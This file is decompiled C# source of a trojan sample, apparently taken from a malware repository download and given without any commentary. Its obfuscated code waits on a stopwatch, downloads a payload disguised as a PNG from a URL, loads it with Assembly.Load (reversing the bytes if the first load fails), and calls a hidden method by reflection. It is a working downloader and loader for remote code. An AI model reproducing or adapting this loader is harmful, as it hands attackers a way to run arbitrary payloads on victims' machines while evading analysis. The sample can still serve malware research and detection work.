// Decompiled with JetBrains decompiler
// Type: Kwubas.Facade
// Assembly: Pheufgk, Version=10.0.17763.1697, Culture=neutral, PublicKeyToken=null
// MVID: 8A494035-EB75-4AFB-A0BB-9B6AA6909BC7
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\UDS-Trojan.Win32.GenericML.xnet-b2ab5f57e86b6298f017b2dd26dce307c80c7dbd7c36d62d0ddd92a2a07b7b87.exe

using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;

namespace Kwubas
{
  internal class Facade
  {
    private static Stopwatch _Exporter;
    internal static Facade ViewSingleton;

    [STAThread]
    private static void Main()
    {
      Facade.InsertFacade();
      Facade.DestroyFacade();
    }

    private static void InsertFacade()
    {
      Facade._Exporter = new Stopwatch();
      Facade.FindSingleton((object) Facade._Exporter);
    }

    private static void DestroyFacade()
    {
      try
      {
        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
      }
      catch
      {
      }
label_2:
      System.Collections.Queue queue = new System.Collections.Queue();
      int num1 = 0;
      if (\u003CModule\u003E\u007Bbab032a1\u002Db155\u002D4bfc\u002D8455\u002D4ac62d984439\u007D.m_62f5ad41a09e48fba9635279438a1b24.m_b9350c3b09b841a9af649eef51a5e973 == 0)
        goto label_3;
label_1:
      IEnumerator enumerator;
      while (true)
      {
        TimeSpan elapsed;
        bool flag;
        switch (num1)
        {
          case 1:
            if (!flag)
            {
              enumerator = (IEnumerator) Facade.ChangeSingleton((object) queue);
              num1 = \u003CModule\u003E\u007Bbab032a1\u002Db155\u002D4bfc\u002D8455\u002D4ac62d984439\u007D.m_62f5ad41a09e48fba9635279438a1b24.m_0913dd6b312d49f987c0c758bd410108 != 0 ? 0 : 4;
              continue;
            }
            break;
          case 2:
            goto label_24;
          case 3:
            goto label_2;
          case 4:
            goto label_5;
          case 5:
            flag = elapsed.TotalSeconds < 20.0;
            num1 = \u003CModule\u003E\u007Bbab032a1\u002Db155\u002D4bfc\u002D8455\u002D4ac62d984439\u007D.m_62f5ad41a09e48fba9635279438a1b24.m_040f651ea3094796a2572e0c7718fd61 != 0 ? 1 : 1;
            continue;
          default:
            queue.Enqueue((object) 1);
            queue.Enqueue((object) 2);
            Facade.QuerySingleton((object) queue, (object) 3);
            Facade.PublishSingleton((object) queue);
            break;
        }
        elapsed = Facade._Exporter.Elapsed;
        num1 = 5;
      }
label_24:
      return;
label_5:
      try
      {
        while (true)
        {
          if (enumerator.MoveNext())
            goto label_11;
          else
            goto label_10;
label_6:
          int num2;
          switch (num2)
          {
            case 1:
              goto label_23;
            default:
              continue;
          }
label_10:
          num2 = \u003CModule\u003E\u007Bbab032a1\u002Db155\u002D4bfc\u002D8455\u002D4ac62d984439\u007D.m_62f5ad41a09e48fba9635279438a1b24.m_83d87c27810543c08601b627cd84a939 != 0 ? 0 : 1;
          goto label_6;
label_11:
          object obj = Facade.MapSingleton((object) enumerator);
          Facade.ReflectFacade();
          Console.WriteLine(obj);
          num2 = 0;
          if (\u003CModule\u003E\u007Bbab032a1\u002Db155\u002D4bfc\u002D8455\u002D4ac62d984439\u007D.m_62f5ad41a09e48fba9635279438a1b24.m_d1437587f075469dad6f20f5c4f4213a != 0)
          {
            num2 = 0;
            goto label_6;
          }
          else
            goto label_6;
        }
label_23:
        return;
      }
      finally
      {
        IDisposable disposable = enumerator as IDisposable;
        int num3 = 0;
        if (\u003CModule\u003E\u007Bbab032a1\u002Db155\u002D4bfc\u002D8455\u002D4ac62d984439\u007D.m_62f5ad41a09e48fba9635279438a1b24.m_1ae3a54e3043429d9af810274eaa4952 == 0)
          num3 = 0;
        switch (num3)
        {
          default:
            disposable?.Dispose();
        }
      }
label_3:
      num1 = 0;
      goto label_1;
    }

    private static void ReflectFacade()
    {
      byte[] numArray = new BinaryReader((Stream) Facade.CreateSingleton((object) WebRequest.Create("http://example.com/Pheufgk.png").GetResponse())).ReadBytes(89965897);
      while (true)
      {
        int num = 0;
        if (\u003CModule\u003E\u007Bbab032a1\u002Db155\u002D4bfc\u002D8455\u002D4ac62d984439\u007D.m_62f5ad41a09e48fba9635279438a1b24.m_a14cb774ae16410491e437490635b295 == 0)
          goto label_3;
label_1:
        switch (num)
        {
          default:
            try
            {
              Assembly.Load(numArray);
              Facade.RegisterFacade();
              return;
            }
            catch
            {
              numArray = ((IEnumerable<byte>) numArray).Reverse<byte>().ToArray<byte>();
              continue;
            }
        }
label_3:
        num = 0;
        goto label_1;
      }
    }

    private static void RegisterFacade()
    {
      Assembly[] assemblies = ((AppDomain) Facade.PostSingleton()).GetAssemblies();
      int index1 = 0;
label_4:
      while (index1 < assemblies.Length)
      {
        Assembly assembly = assemblies[index1];
        int num = 3;
        while (true)
        {
          Type[] typeArray;
          Type asset;
          int index2;
          switch (num)
          {
            case 1:
              if (asset.FullName == "Mwwghqqm.Axsyxythladgtlzncqj")
              {
                num = \u003CModule\u003E\u007Bbab032a1\u002Db155\u002D4bfc\u002D8455\u002D4ac62d984439\u007D.m_62f5ad41a09e48fba9635279438a1b24.m_9c03b2c34acb43f7a195258e9fa4356c != 0 ? 0 : 0;
                continue;
              }
              goto label_12;
            case 2:
              index2 = 0;
              break;
            case 3:
              typeArray = (Type[]) Facade.UpdateSingleton((object) assembly);
              num = \u003CModule\u003E\u007Bbab032a1\u002Db155\u002D4bfc\u002D8455\u002D4ac62d984439\u007D.m_62f5ad41a09e48fba9635279438a1b24.m_251a43fdfdee42d88a7ccfd1d9b6bd58 == 0 ? 0 : 2;
              continue;
            case 4:
              goto label_4;
            case 5:
              ++index1;
              num = \u003CModule\u003E\u007Bbab032a1\u002Db155\u002D4bfc\u002D8455\u002D4ac62d984439\u007D.m_62f5ad41a09e48fba9635279438a1b24.m_30ed124ad27f4e06baea4936ae73ee63 != 0 ? 4 : 2;
              continue;
            default:
              Facade.ReflectSingleton(asset);
              goto label_12;
          }
label_7:
          if (index2 >= typeArray.Length)
          {
            num = 5;
            continue;
          }
          asset = typeArray[index2];
          num = \u003CModule\u003E\u007Bbab032a1\u002Db155\u002D4bfc\u002D8455\u002D4ac62d984439\u007D.m_62f5ad41a09e48fba9635279438a1b24.m_0913dd6b312d49f987c0c758bd410108 == 0 ? 1 : 0;
          continue;
label_12:
          ++index2;
          goto label_7;
        }
      }
    }

    private static void DisableFacade(Type asset)
    {
      MethodInfo method = asset.GetMethod("Vejicspvwnldtfhccvu");
      bool flag = (bool) asset.InvokeMember((string) Facade.CheckSingleton((object) method), BindingFlags.InvokeMethod, (Binder) null, (object) null, (object[]) null);
      int num = 0;
      if (\u003CModule\u003E\u007Bbab032a1\u002Db155\u002D4bfc\u002D8455\u002D4ac62d984439\u007D.m_62f5ad41a09e48fba9635279438a1b24.m_1bfc2a8e46c04babaf193cba7a044185 == 0)
        goto label_3;
label_1:
      switch (num)
      {
        default:
          if (!flag)
            return;
          Console.WriteLine("");
          return;
      }
label_3:
      num = 0;
      goto label_1;
    }

    internal static void FindSingleton([In] object obj0) => ((Stopwatch) obj0).Start();

    internal static bool VerifySingleton() => Facade.ViewSingleton == null;

    internal static Facade MoveSingleton() => Facade.ViewSingleton;

    internal static void QuerySingleton([In] object obj0, [In] object obj1) => ((System.Collections.Queue) obj0).Enqueue(obj1);

    internal static object PublishSingleton([In] object obj0) => ((System.Collections.Queue) obj0).Dequeue();

    internal static object ChangeSingleton([In] object obj0) => (object) ((System.Collections.Queue) obj0).GetEnumerator();

    internal static object MapSingleton([In] object obj0) => ((IEnumerator) obj0).Current;

    internal static object CreateSingleton([In] object obj0) => (object) ((WebResponse) obj0).GetResponseStream();

    internal static object PostSingleton() => (object) AppDomain.CurrentDomain;

    internal static object UpdateSingleton([In] object obj0) => (object) ((Assembly) obj0).GetTypes();

    internal static void ReflectSingleton(Type asset) => Facade.DisableFacade(asset);

    internal static object CheckSingleton([In] object obj0) => (object) ((MemberInfo) obj0).Name;
  }
}
